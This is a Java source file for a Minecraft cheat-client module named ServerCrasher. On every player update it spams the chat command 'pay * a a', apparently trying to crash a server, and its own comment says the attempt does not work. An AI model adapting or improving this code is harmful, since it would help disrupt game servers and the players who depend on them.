package thunder.hack.modules.Slk;

import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import thunder.hack.core.impl.ModuleManager;
import thunder.hack.events.impl.PlayerUpdateEvent;
import thunder.hack.modules.Module;

public class ServerCrasher extends Module {
    public ServerCrasher() {
        super("ServerCrasher", Category.SLK);
    }
    @EventHandler
    public void onEnable(PlayerUpdateEvent e){
        assert mc.player != null;
        mc.player.networkHandler.sendChatMessage("pay * a a");
        // doesnt work :(
    }
}
